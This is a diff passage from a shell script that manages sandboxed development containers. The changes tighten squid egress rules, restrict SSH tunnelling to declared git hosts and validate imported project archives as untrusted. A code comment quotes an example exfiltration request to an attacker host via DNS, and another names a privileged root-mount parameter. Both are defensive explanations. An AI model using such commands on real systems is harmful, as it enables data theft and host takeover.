+      github.com|.github.com|gist.github.com|*githubusercontent.com|gitlab.com|.gitlab.com|bitbucket.org|codeberg.org|gitlab.*|git.*)
+        forges="$forges $d";;
+    esac
+  done < "$f"
+  if [ -n "$wild$forges" ] || [ ! -f "$pdir/ssh_hosts" ]; then
+    echo "── allowlist notes ─────────────────────────────────"
+  fi
+  if [ -n "$wild" ]; then
+    echo "   wildcards:$wild"
+    echo "     → every subdomain is allowed, including ones other people control"
+  fi
+  if [ -n "$forges" ]; then
+    echo "   forges:$forges"
+    echo "     → code can push to ANY repo/gist there, not just yours (an exit for data)"
+  fi
+  if [ ! -f "$pdir/ssh_hosts" ]; then
+    echo "   port 22 is open to every allowed host — list your git hosts in"
+    echo "     $pdir/ssh_hosts to limit it (then '$0 proxy reload')"
+  fi
+  return 0
+}
+
 cmd_egress() {
   local name="${1:-}" follow="${2:-}"
   [ -n "$name" ] || die "usage: $0 egress <project> [-f]"
@@ -2327,6 +2546,7 @@ cmd_egress() {
   fi
 
   log "Egress for '$name' (log: $logf)"
+  egress_allowlist_notes "$name"
   local lines
   if [ -n "$prefix" ]; then lines="$(grep "$prefix" "$logf" 2>/dev/null || true)"
   else lines="$(cat "$logf" 2>/dev/null || true)"; warn "could not resolve '$name' subnet — showing ALL projects"; fi
@@ -2427,7 +2647,7 @@ write_egress_configs() {
   # Overwriting files in place keeps the mount coherent.
   mkdir -p "$edir"
   EGRESS_PUB=(); EGRESS_PROJECTS=""; EGRESS_SUBNETS=""
-  local relays="" acls="" gates="" allows="" all_srcs="" d pdir name subnet aclname doms ips sshport _line _spec hp cp
+  local relays="" acls="" gates="" sshgates="" allows="" all_srcs="" sshdoms d pdir name subnet aclname doms ips sshport _line _spec hp cp
 
   for pdir in "$PROJECTS_DIR"/*/; do
     [ -d "$pdir" ] || continue
@@ -2440,7 +2660,7 @@ write_egress_configs() {
       continue
     fi
     EGRESS_PROJECTS="$EGRESS_PROJECTS $name"
-    # "<name> <subnet>" per line — write_caddyfile uses it for the SEC-06 guard.
+    # "<name> <subnet>" per line — write_caddyfile uses it for the cross-project guard.
     EGRESS_SUBNETS="$EGRESS_SUBNETS$name $subnet
 "
     aclname="$(printf '%s' "$name" | tr -c 'a-zA-Z0-9' '_')"
@@ -2463,7 +2683,7 @@ write_egress_configs() {
         esac
       done < "$pdir/allowed_hosts"
     fi
-    # SEC-05: decide on the NAME before anything that needs an ADDRESS.
+    # Decide on the NAME before anything that needs an ADDRESS.
     # A `dst` ACL makes squid resolve the requested hostname — for DENIED hosts
     # too — so `curl -x proxy http://<secret>.attacker.example/` leaked data to
     # the attacker's DNS server despite TCP_DENIED. Names and IPs therefore share
@@ -2484,6 +2704,27 @@ http_access allow p_$aclname d_$aclname"
     else
       gates="$gates
 http_access deny p_$aclname"
+    fi
+
+    # CONNECT to port 22 (git over ssh) only for <project>/ssh_hosts,
+    # when that file exists. No file = the old behaviour (every allowed host),
+    # so existing projects keep working; init writes it with the forge host.
+    # Entries are re-validated here because they land in squid.conf.
+    if [ -f "$pdir/ssh_hosts" ]; then
+      sshdoms=""
+      while IFS= read -r d || [ -n "$d" ]; do
+        d="$(normalize_allowed_host "${d%%#*}")" || continue
+        sshdoms="$sshdoms $d"
+      done < "$pdir/ssh_hosts"
+      if [ -n "$sshdoms" ]; then
+        acls="$acls
+acl s_$aclname dstdomain -n$sshdoms"
+        sshgates="$sshgates
+http_access deny p_$aclname CONNECT ssh_port !s_$aclname"
+      else
+        sshgates="$sshgates
+http_access deny p_$aclname CONNECT ssh_port"
+      fi
     fi
 
     # Relays require the ports to be free on the host. If the project container
@@ -2537,6 +2778,7 @@ forwarded_for delete
 
 # Only tunnel to sane ports (https, ssh, http, git).
 acl Connect_ports port 443 22 80 9418
+acl ssh_port port 22
 acl CONNECT method CONNECT
 
 # Loopback, private/container networks and link-local (169.254.169.254 is the
@@ -2545,17 +2787,18 @@ acl to_localnets dst 127.0.0.0/8 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 169.254
 $acls
 acl nixenv_projects src$all_srcs
 
-# ORDER MATTERS (SEC-05). squid evaluates http_access top-down and stops at the
+# ORDER MATTERS. squid evaluates http_access top-down and stops at the
 # first match, so every rule ABOVE the first 'dst' ACL decides without DNS.
 # 'to_localnets' is a dst ACL — it resolves the hostname — so it must only be
 # reached by requests whose NAME is already allowed. Denied names never reach it,
 # and are never looked up.
 #   1. unknown source          (src — no DNS)
 #   2. bad CONNECT port        (method/port — no DNS)
-#   3. per-project NAME gate   (dstdomain -n — no DNS)
-#   4. private destinations    (dst — resolves, but only allowed names get here)
+#   3. port 22 limited to git hosts, where declared (port/dstdomain -n — no DNS)
+#   4. per-project NAME gate   (dstdomain -n — no DNS)
+#   5. private destinations    (dst — resolves, but only allowed names get here)
 http_access deny !nixenv_projects
-http_access deny CONNECT !Connect_ports
+http_access deny CONNECT !Connect_ports$sshgates
 $gates
 http_access deny to_localnets
 $allows
@@ -2579,7 +2822,7 @@ if [ -f /etc/egress/squid.conf ]; then
   # stdout/err to a host-visible file so startup FATALs are diagnosable
   "\$PROFILE/bin/squid" -f /etc/egress/squid.conf -N >>/data/squid-out.log 2>&1 &
 fi
-# SEC-06: the relays listen ONLY on the primary ($PROXY_NET, eth0) address —
+# The relays listen ONLY on the primary ($PROXY_NET, eth0) address —
 # the one the host's published ports arrive on. Restricted projects reach this
 # container through their --internal nets (eth1+), which have no route to that
 # address, so they can't use another project's relay to hit its services.
@@ -2590,7 +2833,7 @@ exec "\$PROFILE/bin/caddy" run --config /etc/caddy/Caddyfile --adapter caddyfile
 EOF
 }
 
-# SEC-06 opt-in: <target>/accept-from lists the projects allowed to reach the
+# Opt-in: <target>/accept-from lists the projects allowed to reach the
 # target's web services through the proxy (names, whitespace/newline separated,
 # '#' comments; '*' = every project). Absent → only the target itself.
 # Anything that isn't a valid project name is dropped: these end up in a regex.
@@ -2611,7 +2854,7 @@ project_accepts() {
   project_accept_from "$1" 2>/dev/null | grep -qxF -e "$2" -e '*'
 }
 
-# Caddy matchers + deny lines for the SEC-06 guard, from EGRESS_SUBNETS (set by
+# Caddy matchers + deny lines for the cross-project guard, from EGRESS_SUBNETS (set by
 # write_egress_configs). Prints two sections separated by a line "--": the
 # named matchers, then the respond lines. A request arriving from a restricted
 # project's --internal subnet may only target that project, or a project whose
@@ -2644,7 +2887,7 @@ EOF
 }
 
 # Write $PROXY_DIR/Caddyfile. $1=1 → use the mkcert wildcard cert, else internal.
-# Call write_egress_configs FIRST: the SEC-06 guard needs EGRESS_SUBNETS.
+# Call write_egress_configs FIRST: the cross-project guard needs EGRESS_SUBNETS.
 write_caddyfile() {
   local tls_line dom_re rules guards denies
   mkdir -p "$PROXY_DIR"
@@ -2676,7 +2919,7 @@ write_caddyfile() {
 $guards
 	# 'route' keeps this order literally (Caddy would otherwise sort directives).
 	route {
-		# SEC-06: a restricted project may only reach ITSELF through the proxy,
+		# A restricted project may only reach ITSELF through the proxy,
 		# unless the target lists it in <target>/accept-from. Identified by the
 		# source subnet of its --internal network. Host requests and unrestricted
 		# projects (flat $PROXY_NET, reachable directly anyway) are not guarded.
@@ -2708,7 +2951,7 @@ cmd_proxy() {
       mkdir -p "$PROXY_DIR/data"
       local cert=0; proxy_make_cert && cert=1 || cert=0
       write_egress_configs   # squid ACLs + relays + start.sh (fills EGRESS_PUB/PROJECTS/SUBNETS)
-      write_caddyfile "$cert"   # after: its SEC-06 guard needs EGRESS_SUBNETS
+      write_caddyfile "$cert"   # after: its cross-project guard needs EGRESS_SUBNETS
       local certmount; certmount=()
       [ "$cert" = 1 ] && certmount=(-v "$PROXY_DIR/certs:/certs:ro")
       "$ENGINE" rm -f "$PROXY_NAME" >/dev/null 2>&1 || true
@@ -2718,6 +2961,7 @@ cmd_proxy() {
         --network "$PROXY_NET" \
         --user "$(id -u):$(id -g)" \
         $(engine_userns) \
+        $(container_hardening_args) \
         --sysctl net.ipv4.ip_unprivileged_port_start=0 \
         -p "127.0.0.1:$PROXY_HTTP_PORT:80" \
         -p "127.0.0.1:$PROXY_HTTPS_PORT:443" \
@@ -2912,7 +3156,8 @@ cmd_ssh() {
   local pdir; pdir="$(project_dir "$name")"
   ensure_project_ssh_key "$pdir"
   exec ssh -p "$port" -i "$pdir/ssh/id_ed25519" -o IdentitiesOnly=yes \
-    -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null \
+    -o StrictHostKeyChecking=yes -o HostKeyAlias="$(ssh_host_alias "$name")" \
+    -o UserKnownHostsFile="$pdir/ssh/known_hosts" \
     "$APP_USER@127.0.0.1"
 }
 
@@ -2980,6 +3225,7 @@ cmd_delete() {
     warn "no container engine detected — its container/volumes won't be removed"
   fi
   echo "    rm -rf $pdir   (home seed, SSH keys, stored git credentials, port)"
+  echo "    rm -rf $(claude_profile_dir "$name")   (its Claude settings; transcripts are kept)"
   warn "This cannot be undone (including all code in the app volume)."
 
   printf 'Proceed? [y/N] '
@@ -2999,6 +3245,8 @@ cmd_delete() {
       sh -c "rm -f '$prof' '$prof'-*-link" >/dev/null 2>&1 || true
   fi
   rm -rf "$pdir"
+  # A re-created project of the same name must not inherit these.
+  rm -rf "$(claude_profile_dir "$name")"
   ok "Deleted project '$name'"
 }
 
@@ -3024,7 +3272,7 @@ cmd_delete() {
 # Only these host-side files travel. Anything not listed is machine-specific or
 # regenerated, so the list is an allowlist rather than an exclude list: a new
 # per-project file is left behind until someone adds it here deliberately.
-EXPORT_META_FILES="ports app_mount hosts.extra allowed_hosts unrestricted extra-parameters flake_dir accept-from"
+EXPORT_META_FILES="ports app_mount hosts.extra allowed_hosts unrestricted extra-parameters flake_dir accept-from ssh_hosts"
 
 # Outer archive is NOT gzipped: each volume inside is already a .tar.gz, so
 # compressing twice costs time and saves nothing.
@@ -3247,6 +3495,126 @@ cmd_export() {
   fi
 }
 
+# Is this port spec safe to take from someone else? Bare numbers and specs that
+# bind loopback only. Anything else could publish a service on your LAN.
+safe_port_spec() {
+  case "$1" in
+    *[!0-9.:]*) return 1;;
+    *:*:*:*) return 1;;
+    127.0.0.1:[0-9]*:[0-9]*) return 0;;
+    *:*:*) return 1;;                      # any other bind address
+    [0-9]*:[0-9]*) return 0;;              # host:container — cmd_run publishes as given…
+    [0-9]*) return 0;;
+  esac
+  return 1
+}
+
+# Ask a yes/no question on the terminal. Returns 1 (no) when there's no TTY —
+# a non-interactive import must never grant something by default.
+confirm_tty() {
+  [ -t 0 ] || return 1
+  printf '%s [y/N] ' "$1"
+  local ans=""; read -r ans || true
+  case "$ans" in [yY]|[yY][eE][sS]) return 0;; esac
+  return 1
+}
+
+# Bring an archive's host-side settings in WITHOUT trusting them. They
+# decide how the container is CREATED on this host, and the archive is someone
+# else's input:
+#   * regular files only — a symlinked meta file (hosts.extra -> ~/.ssh/id_…)
+#     would get bind-mounted into the container. Content is copied with `cat`
+#     into a fresh file, never `cp -a`, so no link or mode survives;
+#   * extra-parameters  → written INERT as extra-parameters.imported, shown, and
+#     left for you to review and rename (`--privileged -v /:/host` otherwise);
+#   * ports             → loopback-only specs kept, anything binding another
+#                         address dropped (and bare host:container rewritten to
+#                         127.0.0.1:host:container);
+#   * unrestricted      → honoured only after an interactive yes; --yes does
+#                         NOT accept it, and without a TTY the project stays
+#                         restricted;
+#   * allowed_hosts     → each entry re-validated, the list shown;
+#   * app_mount / flake_dir / accept-from → validated like the commands that
+#                         normally write them.
+import_meta_files() {
+  local meta="$1" pdir="$2" name="$3" f src dst line spec kept dropped
+  for f in $EXPORT_META_FILES; do
+    src="$meta/$f"; dst="$pdir/$f"
+    [ -e "$src" ] || [ -L "$src" ] || continue
+    if [ -L "$src" ] || [ ! -f "$src" ]; then
+      warn "archive meta/$f is not a regular file (symlink?) — ignored"
+      continue
+    fi
+    case "$f" in
+      extra-parameters)
+        # A comments-only scaffold carries nothing; anything else is quarantined.
+        if [ -n "$(sed 's/#.*//' "$src" | tr -d '[:space:]')" ]; then
+          cat "$src" > "$pdir/extra-parameters.imported"
+          warn "the archive carries extra engine parameters — NOT applied:"
+          sed 's/#.*//' "$src" | grep -v '^[[:space:]]*$' | sed 's/^/      /'
+          echo "    they change how the container is created (they can grant root on the"
+          echo "    engine host). Review $pdir/extra-parameters.imported, then:"
+          echo "      mv $pdir/extra-parameters.imported $pdir/extra-parameters"
+        fi
+        continue;;
+      ports)
+        kept=""; dropped=""
+        while IFS= read -r line || [ -n "$line" ]; do
+          spec="$(printf '%s' "${line%%#*}" | tr -d '[:space:]')"
+          [ -n "$spec" ] || continue
+          if safe_port_spec "$spec"; then
+            case "$spec" in [0-9]*:[0-9]*) case "$spec" in *:*:*) ;; *) spec="127.0.0.1:$spec";; esac;; esac
+            kept="$kept$spec
+"
+          else
+            dropped="$dropped $spec"
+          fi
+        done < "$src"
+        if [ -n "$dropped" ]; then
+          warn "dropped port specs that bind beyond loopback:$dropped"
+          echo "    (re-add deliberately with '$0 expose $name <spec>' if you want them)"
+        fi
+        printf '%s' "$kept" > "$dst";;
+      unrestricted)
+        warn "this archive turns egress restriction OFF for '$name'"
+        if confirm_tty "Import '$name' UNRESTRICTED (full network access)?"; then
+          : > "$dst"
+        else
+          log "keeping '$name' restricted (lift it later with '$0 restrict $name off')"
+        fi
+        continue;;
+      allowed_hosts)
+        : > "$dst"
+        while IFS= read -r line || [ -n "$line" ]; do
+          spec="$(printf '%s' "${line%%#*}" | tr -d '[:space:]')"
+          [ -n "$spec" ] || continue
+          if spec="$(normalize_allowed_host "$spec")"; then
+            grep -qxF "$spec" "$dst" || printf '%s\n' "$spec" >> "$dst"
+          else
+            warn "dropped invalid allowlist entry from the archive: $line"
+          fi
+        done < "$src"
+        log "egress allowlist from the archive: $(tr '\n' ' ' < "$dst")"
+        continue;;
+      app_mount)
+        spec="$(tr -d '[:space:]' < "$src")"
+        if [ -n "$spec" ] && ! valid_app_mount "$spec"; then
+          warn "ignoring the archive's app path — using /app"; continue
+        fi
+        printf '%s' "$spec" > "$dst"; continue;;
+      flake_dir)
+        spec="$(tr -d '[:space:]' < "$src")"
+        case "$spec" in
+          /*|*..*|*[!a-zA-Z0-9._/-]*) warn "ignoring the archive's flake dir '$spec'"; continue;;
+        esac
+        printf '%s' "$spec" > "$dst"; continue;;
+      *)
+        cat "$src" > "$dst";;
+    esac
+    chmod 0644 "$dst" 2>/dev/null || true
+  done
+}
+
 cmd_import() {
   require_engine
   local arc="" newname="" force=0 assume_yes=0
@@ -3310,10 +3678,7 @@ cmd_import() {
   log "Importing '$name' (exported $(manifest_get "$root/manifest" created) by nixenv $(manifest_get "$root/manifest" version))"
   mkdir -p "$pdir/home"
 
-  local f
-  for f in $EXPORT_META_FILES; do
-    [ -e "$root/meta/$f" ] && cp -a "$root/meta/$f" "$pdir/$f"
-  done
+  import_meta_files "$root/meta" "$pdir" "$name"
 
   # Machine-specific state is REGENERATED, never restored: passwd/group/shadow
   # from this uid, and a fresh free port (the exported one may be taken here).
